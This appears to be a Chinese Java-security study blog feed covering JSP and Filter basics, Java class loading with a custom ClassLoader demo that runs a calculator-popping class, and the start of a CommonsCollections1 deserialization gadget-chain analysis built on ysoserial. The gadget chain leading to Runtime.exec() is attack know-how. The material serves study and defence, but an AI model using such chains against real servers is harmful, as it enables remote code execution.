<td>引入标签库的定义，可以是自定义标签</td>
</tr>
</tbody></table>
<h3 id="JSP标签（行为）"><a href="#JSP标签（行为）" class="headerlink" title="JSP标签（行为）"></a>JSP标签（行为）</h3><table>
<thead>
<tr>
<th><strong>语法</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>jsp:include</td>
<td>用于在当前页面中包含静态或动态资源</td>
</tr>
<tr>
<td>jsp:useBean</td>
<td>寻找和初始化一个JavaBean组件</td>
</tr>
<tr>
<td>jsp:setProperty</td>
<td>设置 JavaBean组件的值</td>
</tr>
<tr>
<td>jsp:getProperty</td>
<td>将 JavaBean组件的值插入到 output中</td>
</tr>
<tr>
<td>jsp:forward</td>
<td>从一个JSP文件向另一个文件传递一个包含用户请求的request对象</td>
</tr>
<tr>
<td>jsp:plugin</td>
<td>用于在生成的HTML页面中包含Applet和JavaBean对象</td>
</tr>
<tr>
<td>jsp:element</td>
<td>动态创建一个XML元素</td>
</tr>
<tr>
<td>jsp:attribute</td>
<td>定义动态创建的XML元素的属性</td>
</tr>
<tr>
<td>jsp:body</td>
<td>定义动态创建的XML元素的主体</td>
</tr>
<tr>
<td>jsp:text</td>
<td>用于封装模板数据</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;jsp:include page=<span class="string">&quot;date.jsp&quot;</span> flush=<span class="string">&quot;true&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>

<h2 id="JSP九大内置对象"><a href="#JSP九大内置对象" class="headerlink" title="JSP九大内置对象"></a>JSP九大内置对象</h2><table>
<thead>
<tr>
<th><strong>对象</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>request</td>
<td><strong>HttpServletRequest</strong>类的实例</td>
</tr>
<tr>
<td>response</td>
<td><strong>HttpServletResponse</strong>类的实例</td>
</tr>
<tr>
<td>out</td>
<td><strong>PrintWriter</strong>类的实例，用于把结果输出至网页上</td>
</tr>
<tr>
<td>session</td>
<td><strong>HttpSession</strong>类的实例</td>
</tr>
<tr>
<td>application</td>
<td><strong>ServletContext</strong>类的实例，与应用上下文有关</td>
</tr>
<tr>
<td>config</td>
<td><strong>ServletConfig</strong>类的实例</td>
</tr>
<tr>
<td>pageContext</td>
<td><strong>PageContext</strong>类的实例，提供对JSP页面所有对象以及命名空间的访问</td>
</tr>
<tr>
<td>page</td>
<td>类似于Java类中的this关键字</td>
</tr>
<tr>
<td>Exception</td>
<td><strong>Exception</strong>类的对象，代表发生错误的JSP页面中对应的异常对象</td>
</tr>
</tbody></table>
<h3 id="JSP四大作用域"><a href="#JSP四大作用域" class="headerlink" title="JSP四大作用域"></a>JSP四大作用域</h3><p>page、request、session、application</p>
<h2 id="JSTL核心标签"><a href="#JSTL核心标签" class="headerlink" title="JSTL核心标签"></a>JSTL核心标签</h2><p><a href="https://www.runoob.com/jsp/jsp-jstl.html">https://www.runoob.com/jsp/jsp-jstl.html</a></p>
<h1 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h1><p>实体类</p>
<p>有特定的写法</p>
<ul>
<li>必须有个无参构造</li>
<li>属性必须私有化</li>
<li>必须有对应的get和set</li>
</ul>
<p>一般用来和数据库的字段做映射 </p>
<p>ORM：对象关系映射</p>
<ul>
<li>表——类</li>
<li>字段——属性</li>
<li>行记录——对象</li>
</ul>
<h1 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h1><p><a href="https://openhome.cc/Gossip/Spring/MVC.html">https://openhome.cc/Gossip/Spring/MVC.html</a></p>
<p><img src="https://o.130014.xyz/2022/03/03/image-20220303161543-ctzr0eo.png" alt="image-20220303161543-ctzr0eo.png"></p>
<h1 id="过滤器Filter"><a href="#过滤器Filter" class="headerlink" title="过滤器Filter"></a>过滤器Filter</h1><p>用来过滤网站的数据</p>
<ul>
<li>处理中文乱码</li>
<li>登录验证</li>
</ul>
<p>过滤器中的所有代码，在过滤特定请求的时候都会执行</p>
<p>必须要让过滤器继续通行<code>filterChain.doFilter(servletRequest, servletResponse);</code></p>
<p>实现一个编码转换过滤器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CharacterEncodingFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;初始化——————&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        servletRequest.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        servletResponse.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        servletResponse.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;执行前&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);<span class="comment">//让请求或相应继续通行</span></span><br><span class="line">        System.out.println(<span class="string">&quot;执行后&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;销毁——————&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>web.xml中注册过滤器</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>character<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.kuang.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>character<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h1><p>实现一个监听器的接口，监听器有很多种，选择我们需要的接口即可</p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA类加载</title>
    <url>/2022/03/18/JAVA%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>从一下几个方面了解JAVA中，类加载的原理</p>
<ol>
<li>java代码执行过程</li>
<li>类的加载过程</li>
<li>类加载器</li>
<li>类加载机制</li>
<li>自定义一个自己的类加载器</li>
</ol>
<h1 id="java代码执行流程"><a href="#java代码执行流程" class="headerlink" title="java代码执行流程"></a>java代码执行流程</h1><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318204423-paolccp.png" alt="image.png"><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318204536-oxlseqj.png" alt="image.png"></p>
<p>当 .java 源码被 javac.exe 编译器编译成 .class 字节码文件后，接下来的工作就交给JVM处理。JVM首先通过类加载器(ClassLoader)，将class文件和相关Java API加载装入JVM，以供JVM后续处理。</p>
<h1 id="类的加载过程"><a href="#类的加载过程" class="headerlink" title="类的加载过程"></a>类的加载过程</h1><p>类的生命周期包括：加载、链接、初始化、使用、卸载</p>
<p>其中前三个属于类的<u>加载过程</u></p>
<h2 id="加载-loading"><a href="#加载-loading" class="headerlink" title="加载-loading"></a>加载-loading</h2><p>把<code>.class</code>文件加载到JVM里的过程</p>
<ul>
<li>通过类的全限定名来获取定义此类的二进制字节流</li>
<li>将此二进制字节流所代表的静态存储结构转化成方法区的运行时数据结构</li>
<li>在内存中生成代表此类的java.lang.Class对象,作为该类访问入口.</li>
</ul>
<h2 id="链接-linking"><a href="#链接-linking" class="headerlink" title="链接-linking"></a>链接-linking</h2><p>链接分为三步</p>
<ul>
<li><p>验证:验证的目的是确保class文件的字节流中信息符合虚拟机的要求，不会危害虚拟机安全，使得虚拟机免受恶意代码的攻击，这一步至关重要。</p>
<blockquote>
<p>文件格式验证<br>源数据验证<br>字节码验证<br>符号引用验证  </p>
</blockquote>
</li>
<li><p>准备:准备阶段的工作就是为类的静态变量<strong>分配内存</strong>并设为jvm默认的<strong>初值</strong>，对于非静态的变量，则不会为它们分配内存。静态变量的初值为jvm默认的初值，而不是我们在程序中设定的初值。(仅包含类变量,不包含实例变量).</p>
</li>
<li><p>解析:虚拟机将常量池中的符号引用替换为直接引用，解析动作主要针对类或接口，字段，类方法，方法类型等等。</p>
</li>
</ul>
<h2 id="初始化-initialization"><a href="#初始化-initialization" class="headerlink" title="初始化-initialization"></a>初始化-initialization</h2><p>在该阶段，才真正意义上的开始执行类中定义的java程序代码，该阶段会执行类构造器。</p>
<blockquote>
<p>暂讨论关于类生命周期的三种，之后在学习内存的时候细嗦</p>
</blockquote>
<h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><h2 id="ClassLoader的作用"><a href="#ClassLoader的作用" class="headerlink" title="ClassLoader的作用"></a>ClassLoader的作用</h2><blockquote>
<p><strong>ClassLoader用于将class文件加载到JVM中。</strong></p>
</blockquote>
<p>另外一个作用是确认每个类应该由哪个类加载器加载。<br>第二个作用也用于判断JVM运行时的两个类是否相等，影响的判断方法有equals()、isAssignableFrom()、isInstance()以及instanceof关键字。</p>
<h2 id="何时触发类加载"><a href="#何时触发类加载" class="headerlink" title="何时触发类加载"></a>何时触发类加载</h2><p>类加载的触发可以分为隐式加载和显示加载。</p>
<h3 id="隐式加载"><a href="#隐式加载" class="headerlink" title="隐式加载"></a>隐式加载</h3><p>隐式加载包括以下几种情况：</p>
<ul>
<li>遇到new、getstatic、putstatic、invokestatic这4条字节码指令时</li>
<li>对类进行反射调用时</li>
<li>当初始化一个类时，如果其父类还没有初始化，优先加载其父类并初始化</li>
<li>虚拟机启动时，需指定一个包含main函数的主类，优先加载并初始化这个主类</li>
</ul>
<h3 id="显式加载"><a href="#显式加载" class="headerlink" title="显式加载"></a>显式加载</h3><p>显示加载包含以下几种情况：</p>
<ul>
<li>通过ClassLoader的loadClass方法</li>
<li>通过Class.forName（反射获取Class）</li>
<li>通过ClassLoader的findClass方法</li>
</ul>
<h2 id="ClassLoader分类"><a href="#ClassLoader分类" class="headerlink" title="ClassLoader分类"></a>ClassLoader分类</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318210756-8jnb18t.png" alt="image.png"></p>
<p>从上到下认识他们</p>
<h3 id="启动类-x2F-引导类：Bootstrap-ClassLoader"><a href="#启动类-x2F-引导类：Bootstrap-ClassLoader" class="headerlink" title="启动类&#x2F;引导类：Bootstrap ClassLoader"></a>启动类&#x2F;引导类：Bootstrap ClassLoader</h3><p>这个类加载器使用C&#x2F;C++语言实现的，嵌套在JVM内部，java程序无法直接操作这个类。它用来加载<strong>Java核心类库</strong>，如：<code>JAVA_HOME/jre/lib/rt.jar</code>、<code>resources.jar</code>、<code>sun.boot.class.path</code>路径下的包，用于提供<strong>jvm运行所需的包</strong>。</p>
<p>并不是继承自java.lang.ClassLoader，它没有父类加载器</p>
<p>它加载<code>扩展类加载器</code>和<code>应用程序类加载器</code>，并成为他们的<strong>父类加载器</strong></p>
<p>出于安全考虑，启动类只加载包名为：java、javax、sun开头的类</p>
<h3 id="扩展类加载器：Extension-ClassLoader"><a href="#扩展类加载器：Extension-ClassLoader" class="headerlink" title="扩展类加载器：Extension ClassLoader"></a>扩展类加载器：Extension ClassLoader</h3><p>Java语言编写，由<code>sun.misc.Launcher$ExtClassLoader</code>实现，我们可以用Java程序操作这个加载器派生继承自java.lang.ClassLoader，父类加载器为<code>启动类加载器</code></p>
<p>从系统属性：<code>java.ext.dirs</code>目录中加载类库，或者从JDK安装目录：<code>jre/lib/ext</code>目录下加载类库。我们就可以将我们自己的包放在以上目录下，就会自动加载进来了。</p>
<h3 id="应用程序类加载器：Application-Classloader"><a href="#应用程序类加载器：Application-Classloader" class="headerlink" title="应用程序类加载器：Application Classloader"></a>应用程序类加载器：Application Classloader</h3><p>程序默认的类加载器，我们编写的类就是由他来加载。</p>
<p>Java语言编写，由sun.misc.Launcher$AppClassLoader实现。<br>派生继承自<code>java.lang.ClassLoader</code>，父类加载器为ExtClassloader</p>
<p>它负责加载环境变量classpath或者系统属性java.class.path指定路径下的类库</p>
<p>我们可以通过<code>ClassLoader#getSystemClassLoader()</code>获取并操作这个加载器</p>
<h3 id="自定义加载器"><a href="#自定义加载器" class="headerlink" title="自定义加载器"></a>自定义加载器</h3><p>为了实现自己的功能，比如加强安全传输，我们可以自己编写加载器。</p>
<p>继承<code>java.lang.ClassLoader</code>类，重写findClass()方法如果没有太复杂的需求，可以直接继承<code>URLClassLoader</code>类，重写<code>loadClass</code>方法，具体可参考<code>AppClassLoader</code>和<code>ExtClassLoader</code>。</p>
<h2 id="获取ClassLoader"><a href="#获取ClassLoader" class="headerlink" title="获取ClassLoader"></a>获取ClassLoader</h2><p>除了启动类加载器，其他加载器都是继承自<code>java.lang.ClassLoader</code>这个抽象类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：获取当前类的 ClassLoader</span></span><br><span class="line">clazz.getClassLoader()</span><br><span class="line"><span class="comment">// 方式二：获取当前线程上下文的 ClassLoader</span></span><br><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line"><span class="comment">// 方式三：获取系统的 ClassLoader</span></span><br><span class="line">ClassLoader.getSystemClassLoader()</span><br><span class="line"><span class="comment">// 方式四：获取调用者的 ClassLoader</span></span><br><span class="line">DriverManager.getCallerClassLoader()</span><br></pre></td></tr></table></figure>

<h1 id="类加载机制-双亲委派"><a href="#类加载机制-双亲委派" class="headerlink" title="类加载机制-双亲委派"></a>类加载机制-双亲委派</h1><p>jvm对class文件采用的是按需加载的方式，当需要使用该类时，jvm才会将它的class文件加载到内存中产生class对象。</p>
<p>在加载类的时候，是采用的<code>双亲委派机制</code>，即把请求交给父类处理的一种<code>任务委派模式。</code></p>
<p>这也被叫做<code>双亲委派模型</code>，在jdk1.2之后引入</p>
<blockquote>
<p>其中，两个用户自定义类加载器的父加载器是AppClassLoader，AppClassLoader的父加载器是ExtClassLoader，ExtClassLoader是没有父类加载器的，在代码中，ExtClassLoader的父类加载器为null。BootstrapClassLoader也并没有子类，因为他完全由JVM实现。</p>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318212050-guhqqwe.png" alt="image.png"></p>
<h2 id="工作逻辑"><a href="#工作逻辑" class="headerlink" title="工作逻辑"></a>工作逻辑</h2><p>（1）如果一个<code>类加载器</code>接收到了<code>类加载</code>的请求，它自己不会先去加载，会把这个请求委托给<code>父类加载器</code>去执行。</p>
<p>（2）如果父类还存在父类加载器，则继续向上委托，一直委托到<code>启动类加载器：Bootstrap ClassLoader</code></p>
<p>（3）如果父类加载器可以完成加载任务，就返回成功结果，如果父类加载失败，就由子类自己去尝试加载，如果子类加载失败就会抛出<code>ClassNotFoundException</code>异常，这就是<code>双亲委派模式</code></p>
<h2 id="使用目的"><a href="#使用目的" class="headerlink" title="使用目的"></a>使用目的</h2><p>双亲委派模型能够保证类在内存中的<strong>唯一性</strong>，能够保证系统级别类的安全，因为当启动类ClassLoader加载过了之后，子ClassLoader便不会再加载：</p>
<p>1、防止重复加载同一个<code>.class</code>。通过委托去向上面问一问，加载过了，就不用再加载一遍。保证数据安全。<br>2、保证核心<code>.class</code>不能被篡改。通过委托方式，不会去篡改核心<code>.clas</code>，即使篡改也不会去加载，即使加载也不会是同一个<code>.class</code>对象了。不同的加载器加载同一个<code>.class</code>也不是同一个<code>Class</code>对象。这样保证了<code>Class</code>执行安全。</p>
<h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><p>loadClass方法如下，代码中做了注释解析</p>
<p>双亲委派模型实现的核心就是这个loadClass方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        <span class="comment">// 先查看这个类是否已经被自己加载了</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 如果有父类加载器，先委派给父类加载器来加载</span></span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果父类加载器为null，说明ExtClassLoader也没有找到目标类，则调用BootstrapClassLoader来查找</span></span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果都没有找到，调用findClass方法，尝试自己加载这个类</span></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h1><p>我们可以实现自己的类加载器，加载<strong>指定路径</strong>下的class文件</p>
<ul>
<li>通过loadClass在指定的路径下查找文件。</li>
<li>通过findClass方法解析class字节流，并实例化class对象。</li>
</ul>
<p>编写一个自己的ClassLoader</p>
<blockquote>
<p>defineClass：将字节码变成内存中的class</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xianbei.test3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String classPath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestClassLoader</span><span class="params">(String classPath)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classPath = classPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] classBytes = getData(name);</span><br><span class="line">            <span class="comment">//defineClass来生成class实例</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name,classBytes,<span class="number">0</span>,classBytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//该方法读取目标class文件的字节码并返回</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] getData(String className) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> classPath+ File.separator + className.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//读取字节</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((num = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                stream.write(buffer, <span class="number">0</span> ,num);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> stream.toByteArray();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>然后我们尝试加载自己电脑上指定路径的class文件：</p>
<p>这是我要加载的class文件，之前用JAVAssist控制字节码编写的恶意类</p>
<blockquote>
<p>这里有个静态块，就是最后的static</p>
<p>在实例化的时候会被自动加载</p>
<p>关于JAVAssist不在此多做赘述</p>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318233518-9dfmw13.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCLDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TestClassLoader</span> <span class="variable">myClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>(<span class="string">&quot;C:\\Users\\Liyc\\IdeaProjects\\JavassistTest\\out&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; newStudent = myClassLoader.loadClass(<span class="string">&quot;NewStudent&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; c = newStudent.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> c.newInstance(<span class="string">&quot;Xianbei&quot;</span>,<span class="number">19</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318233657-sw8m038.png" alt="image.png"></p>
<p>成功弹出计算机，也就是成功加载了指定路径下的class文件并且用反射将其实例化了。</p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>贴几张好文和好图</p>
<p><a href="https://www.cnblogs.com/goloving/p/14438785.html">https://www.cnblogs.com/goloving/p/14438785.html</a>讲双亲委派的</p>
<p><a href="https://www.jianshu.com/p/fe8a01b0c3b7">https://www.jianshu.com/p/fe8a01b0c3b7</a>讲java代码运行机制的</p>
<p><a href="https://zhuanlan.zhihu.com/p/67991761">https://zhuanlan.zhihu.com/p/67991761</a>讲类加载的</p>
<p><a href="https://www.cnblogs.com/xrq730/p/4847337.html">https://www.cnblogs.com/xrq730/p/4847337.html</a>很多种类加载器的写法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318213310-uz3iggg.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections1反序列化链分析</title>
    <url>/2022/03/15/cc1study2/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>之前其实分析过一次，但经过一段时间调试，打算再做一次。</p>
<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>用ysoserial生成payload然后发送，webserver环境就是之前搭建的</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314202817-1qr5nnn.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314202933-vw945je.png" alt="image.png"></p>
<p>测试成功</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><a href="https://xianbei.top/2022/03/08/javacc31study/">之前一开始分析的链子</a>也是CC，但是没有调试，为了进一步学习，再分析一遍Ysoserial中的链子构造原理</p>
<h2 id="反序列化链总览"><a href="#反序列化链总览" class="headerlink" title="反序列化链总览"></a>反序列化链总览</h2><p>Ysoserial中的利用链，能够发现使用的是LazyMap利用链。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">				Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">					AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">						LazyMap.get()</span></span><br><span class="line"><span class="comment">							ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">								ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Class.getMethod()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>


<h2 id="transformerChain"><a href="#transformerChain" class="headerlink" title="transformerChain"></a>transformerChain</h2><p>50行：初始化了一个命令数组，用来获取命令参数</p>
<p>52行：初始化了一条transformerChain，通过下文看应该是用来存放Transformer对象的链子</p>
<p>55行：很熟悉，构建的调用反射方法链子，在上一篇文章里讲的很清楚，不同的是最后65行加入了一个<code>new ConstantTransformer(1);</code></p>
<p>所以最后返回值是一个1。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314224552-sry5i1x.png" alt="image.png"></p>
<p>接着开始构建HashMap攻击链</p>
<p>初始化了一个<code>HashMap</code></p>
<p>通过<code>LazyMap</code>的<code>decorate</code>方法返回了一个<code>LazyMap</code>实例</p>
<p>其中第二个参数传入的是一个目前还是空的transformerChain实例对象</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314230043-jz988gm.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314230704-6yt7oor.png" alt="image.png"></p>
